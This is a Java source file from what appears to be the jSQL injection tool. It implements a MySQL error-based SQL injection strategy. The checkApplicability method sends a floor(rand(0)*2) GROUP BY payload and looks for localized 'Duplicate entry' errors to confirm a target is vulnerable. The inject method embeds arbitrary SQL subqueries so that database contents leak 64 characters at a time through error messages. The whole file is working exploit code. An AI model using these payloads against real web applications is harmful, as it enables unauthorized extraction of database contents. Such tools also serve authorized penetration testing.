package com.jsql.model.pattern.strategy;

import com.jsql.exception.StoppableException;
import com.jsql.model.InjectionModel;
import com.jsql.model.Interruptable;
import com.jsql.model.Stoppable;
import com.jsql.model.bean.Request;

public class ErrorbasedStrategy implements IInjectionStrategy {
	private InjectionModel model;
	private boolean isApplicable = false;

	public ErrorbasedStrategy(InjectionModel model){
		this.model = model;
	}

	@Override
	public void checkApplicability() {
		model.sendMessage("Error based test...");
		
		String performanceSourcePage = model.inject(
			model.insertionCharacter + "+and(" +
                "select+1+" +
                "from(" +
	                "select+" +
	                	"count(*)," +
	                	"floor(rand(0)*2)" +
	                "from+" +
	                	"information_schema.tables+" +
	                "group+by+2" +
                ")a" +
            ")--+"
        );

		isApplicable = performanceSourcePage.indexOf("Duplicate entry '1' for key ") != -1 ||
                performanceSourcePage.indexOf("Like verdier '1' for ") != -1 ||
                performanceSourcePage.indexOf("Like verdiar '1' for ") != -1 ||
                performanceSourcePage.indexOf("Kattuv väärtus '1' võtmele ") != -1 ||
                performanceSourcePage.indexOf("Opakovaný kµúè '1' (èíslo kµúèa ") != -1 ||
                performanceSourcePage.indexOf("pienie '1' dla klucza ") != -1 ||
                performanceSourcePage.indexOf("Duplikalt bejegyzes '1' a ") != -1 ||
                performanceSourcePage.indexOf("Ens værdier '1' for indeks ") != -1 ||
                performanceSourcePage.indexOf("Dubbel nyckel '1' för nyckel ") != -1 ||
                performanceSourcePage.indexOf("klíè '1' (èíslo klíèe ") != -1 ||
                performanceSourcePage.indexOf("Duplicata du champ '1' pour la clef ") != -1 ||
                performanceSourcePage.indexOf("Entrada duplicada '1' para la clave ") != -1 ||
                performanceSourcePage.indexOf("Cimpul '1' e duplicat pentru cheia ") != -1 ||
                performanceSourcePage.indexOf("Dubbele ingang '1' voor zoeksleutel ") != -1 ||
                performanceSourcePage.indexOf("Valore duplicato '1' per la chiave ") != -1 ||
                /*jp missing*/
                performanceSourcePage.indexOf("Dupliran unos '1' za klju") != -1 ||
                performanceSourcePage.indexOf("Entrada '1' duplicada para a chave ") != -1
                /*kr grk ukr rss missing*/
                ;
		
		if(isApplicable)
			activate();
		else
			deactivate();
	}

	@Override
	public boolean isApplicable() {
		return isApplicable;
	}

	@Override
	public void activate() {
        Request request = new Request();
        request.setMessage("MarkErrorbasedVulnerable");
        model.interact(request);
	}

	@Override
	public void deactivate() {
		Request request = new Request();
        request.setMessage("MarkErrorbasedInvulnerable");
        model.interact(request);
	}

	@Override
	public String inject(String sqlQuery, String startPosition, Interruptable interruptable, Stoppable stoppable) throws StoppableException {
		return model.inject( 
                model.insertionCharacter + "+and" +
                    "(" +
                        "select+" +
                        	"1+" +
                        "from(" +
	                        "select+" +
		                        "count(*)," +
		                        "concat(" +
			                        "0x53514c69," +
			                        "mid(" +
				                        "("+ sqlQuery +")," +
				                        startPosition + "," +
				                        "64" +
			                        ")," +
		                        "floor(rand(0)*2)" +
	                        ")" +
	                        "from+information_schema.tables+" +
	                        "group+by+2" +
                        ")a" +
                	")--+" );
	}

	@Override
	public void applyStrategy() {
		model.sendMessage("Using error based injection...");
		model.applyStrategy(this);
		
		Request request = new Request();
        request.setMessage("MarkErrorbasedStrategy");
        model.interact(request);
	}
}
